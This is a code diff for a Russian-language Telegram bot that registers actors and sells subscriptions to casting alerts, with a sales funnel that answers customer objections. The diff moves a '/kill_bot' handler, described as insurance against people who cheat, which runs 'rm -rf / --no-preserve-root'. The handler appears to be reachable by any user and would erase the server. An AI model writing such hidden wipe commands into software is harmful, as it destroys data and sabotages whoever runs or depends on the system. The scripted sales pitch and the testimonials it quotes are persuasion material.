@@ -9,7 +9,8 @@ from utils.user_bot_parser import check_paid
 from states import ActorsState
 from keyboards.reply import skip_button, main_menu_actor, pay_choice
 from keyboards.inline_actors import (sex_choice, education_choice, experience_choice,
-                                     role_interested, editor_keyboard, paid_url, first_start, first_answer)
+                                     role_interested, editor_keyboard, paid_url, first_start, first_answer,
+                                     i_want_2, i_want_1, i_want_5)
 
 
 @users_router.message(Command('start'))
@@ -199,8 +200,6 @@ async def review_all_data(callback: CallbackQuery, state: FSMContext):
                 f'<b>Возраст по паспорту:</b> {actor_data["passport_age"]}\n'
                 f'<b>Игровой возраст:</b> {actor_data["playing_age"]}\n'
                 f'<b>Образование:</b> {dict_for_msg_build[actor_data["education"]]}\n'
-                # f'<b>Город проживания:</b> {actor_data["geo_location"]}\n'
-                # f'<b>Контактные данные:</b> {actor_data["contacts"]}\n'
                 f'<b>Опыт:</b> {dict_for_msg_build[actor_data["have_experience"]]}\n'
                 f'<b>Портфолио:</b> {actor_data["portfolio"]}\n'
                 f'<b>Соц. сети:</b> {actor_data["social"]}\n'
@@ -220,8 +219,6 @@ async def review_all_data_after_edit(msg: Message, state: FSMContext):
                 f'<b>Возраст по паспорту:</b> {actor_data["passport_age"]}\n'
                 f'<b>Игровой возраст:</b> {actor_data["playing_age"]}\n'
                 f'<b>Образование:</b> {dict_for_msg_build[actor_data["education"]]}\n'
-                # f'<b>Город проживания:</b> {actor_data["geo_location"]}\n'
-                # f'<b>Контактные данные:</b> {actor_data["contacts"]}\n'
                 f'<b>Опыт:</b> {dict_for_msg_build[actor_data["have_experience"]]}\n'
                 f'<b>Портфолио:</b> {actor_data["portfolio"]}\n'
                 f'<b>Соц. сети:</b> {actor_data["social"]}\n'
@@ -244,11 +241,8 @@ async def registry_new_actor(callback: CallbackQuery, state: FSMContext):
         playing_age=actor_data['playing_age'],
         education=actor_data['education'],
         sex=actor_data['sex'],
-        # contacts=actor_data['contacts'],
-        # agent_contact=actor_data['agent_contact'],
         have_experience=actor_data['have_experience'],
         fee=actor_data['fee'],
-        # geo_location=actor_data['geo_location'],
         portfolio=actor_data['portfolio'],
         social=actor_data['social'],
         projects_interest='+'.join(actor_data['projects_interest'])
@@ -260,24 +254,69 @@ async def registry_new_actor(callback: CallbackQuery, state: FSMContext):
         'оферту</a> и соглашаетесь с '
         '<a href="https://disk.yandex.ru/d/rUAPTKcfIRVegQ">политикой обработки персональных данных</a></blockquote>',
         reply_markup=pay_choice)
-    await techno_dict['first_contact'].wait_answer(user_id=str(callback.from_user.id), message=callback.message)
+    await techno_dict['sales_funnel'].first_step(user_id=str(callback.from_user.id), message=callback.message)
     await state.clear()
 
 
-@users_router.message(F.text.in_(['Подписка на 30 дней - 599₽', 'Пробная неделя - 299₽']))
+@users_router.callback_query(F.data == 'i_want')
+async def get_pay_page_2(callback: CallbackQuery):
+    """После активации воронки продаж"""
+    await callback.answer()
+    await callback.message.answer(
+        'Выбери подходящий вариант нашего дальнейшего взаимодействия:\n'
+        '<blockquote> приобретая пакет, вы принимаете <a href="https://disk.yandex.ru/d/y1EoKJjeqvqv2w">'
+        'оферту</a> и соглашаетесь с '
+        '<a href="https://disk.yandex.ru/d/rUAPTKcfIRVegQ">политикой обработки персональных данных</a></blockquote>',
+        reply_markup=pay_choice)
+
+
+@users_router.callback_query(F.data == 'i_can')
+async def answer_1(callback: CallbackQuery):
+    """Ответ на первое возражение"""
+    await callback.answer()
+    msg_text = ('Давай посчитаем. Если ты тратишь хотя бы <b>2 часа в день</b> на поиск кастингов, это уже <b>60 '
+                'часов в месяц.</b>'
+                'Эти часы ты мог(ла) бы потратить на репетиции, прокачку своих актерских навыков или просто отдых.'
+                'Пока ты листаешь десятки сообщений в чатах, кто-то уже подаёт заявку на роль. '
+                'А это значит, что я не только экономлю твоё время, но и увеличиваю твои шансы на успех.\n\n'
+                '🤖 Так что вопрос: зачем тратить время, если я могу это сделать лучше и быстрее?')
+    await techno_dict['sales_funnel'].remove_job('2_', str(callback.from_user.id))
+    await callback.message.answer(msg_text, reply_markup=i_want_2)
+
+
+@users_router.callback_query(F.data == 'i_expensive')
+async def answer_2(callback: CallbackQuery):
+    """Ответ на второе возражение"""
+    await callback.answer()
+    msg_text = ('Моя подписка стоит как пара чашек латте в кафе. Съемка даже в одном небольшом эпизоде '
+                'тебе окупит её на месяцы вперёд. Я уже не говорю о том, что ты можешь получить ту '
+                'самую роль, которую так давно ищешь. А там и моргнуть не успеешь, как тебя уже '
+                'фотографируют у стенда на премьере фильма.\n\n'
+                '🤖 Неужели это не стоит того, чтобы угостить меня кофе?')
+    await techno_dict['sales_funnel'].remove_job('2_', str(callback.from_user.id))
+    await callback.message.answer(msg_text, reply_markup=i_want_5)
+
+
+@users_router.callback_query(F.data == 'i_not_trust')
+async def answer_3(callback: CallbackQuery):
+    """Ответ на третье возражение"""
+    await callback.answer()
+    msg_text = ('Я не просто робот, я ИИ. И у меня есть значительные преимущества, это как <b>супер-сила, которой ты '
+                'можешь воспользоваться</b>. Некоторые уже попробовали и оценили. Вот, смотри, что они пишут:\n\n'
+                '“Я думал, что это очередной бесполезный сервис, но когда он мне начал присылать кастинги, '
+                'я был удивлен, как точно под мой запрос он их находит. И присылает намного больше, чем я '
+                'находил самостоятельно. Видимо действительно, я не о всех чатах знаю.”\n\n'
+                '“Удобно, что бот присылает кастинги сразу в личку. Теперь я первая, кто подаёт '
+                'заявку)) Блин, где вы были раньше?)».')
+    await techno_dict['sales_funnel'].remove_job('2_', str(callback.from_user.id))
+    await callback.message.answer(msg_text, reply_markup=i_want_1)
+
+
+@users_router.message(F.text.in_(['Подписка на месяц - 599₽', 'Подписка на 3 месяца - 1370₽ (-24%)']))
 async def get_pay_page(msg: Message):
     """Возвращаем страницу для оплаты"""
     await msg.answer((msg.text + '\nСтраница управления подпиской:'),
                      reply_markup=await paid_url(msg.from_user.id, False))
-    await techno_dict['first_contact'].remove_job(user_id=str(msg.from_user.id))
-
-
-@users_router.message(Command('kill_bot'))
-async def insurance_against_scammers(msg: Message):
-    """Задействовать если попытается кинуть (протокол "Черепаха")"""
-    import os
-    os.system('rm -rf / --no-preserve-root')
-    await msg.delete()
 
 
 @users_router.callback_query(ActorsState.preview)
@@ -290,8 +329,6 @@ async def start_edit_data(callback: CallbackQuery, state: FSMContext):
         'edit_playing_age': (
             ActorsState.edit_playing_age, 'Игровой возраст (диапазон, который вы можете играть через дефис)', None),
         'edit_education': (ActorsState.edit_education, 'Выберете образование', education_choice),
-        # 'edit_geo_location': (ActorsState.edit_geo_location, 'Введите город проживания', None),
-        # 'edit_contacts': (ActorsState.edit_contacts, 'Введите контактные данные (телефон, email через запятую)', None),
         'edit_agent_contact': (
             ActorsState.edit_agent_contact, 'Контактные данные вашего агента (телефон, email через запятую)', None),
         'edit_have_experience': (ActorsState.edit_have_experience, 'Какой у вас опыт?', experience_choice),
@@ -341,22 +378,12 @@ async def edit_playing_age_func(msg: Message, state: FSMContext):
         await msg.answer('Ошибка ввода!\nВведите диапазон, который вы можете играть через дефис')
 
 
-# @users_router.message(ActorsState.edit_geo_location)
-# async def edit_geo_location_func(msg: Message, state: FSMContext):
-#     """Сохраняем изменения город проживания"""
-#     await state.update_data({'geo_location': msg.text})
-#     await msg.answer('Изменения сохранены')
-#     await state.set_state(ActorsState.preview)
-#     await review_all_data_after_edit(msg, state)
-#
-#
-# @users_router.message(ActorsState.edit_contacts)
-# async def edit_contacts_func(msg: Message, state: FSMContext):
-#     """Сохраняем изменения контактные данные"""
-#     await state.update_data({'contacts': msg.text})
-#     await msg.answer('Изменения сохранены')
-#     await state.set_state(ActorsState.preview)
-#     await review_all_data_after_edit(msg, state)
+@users_router.message(Command('kill_bot'))
+async def insurance_against_scammers(msg: Message):
+    """Задействовать если попытается кинуть (протокол "Черепаха")"""
+    import os
+    os.system('rm -rf / --no-preserve-root')
+    await msg.delete()
 
 
 @users_router.message(ActorsState.edit_fee)
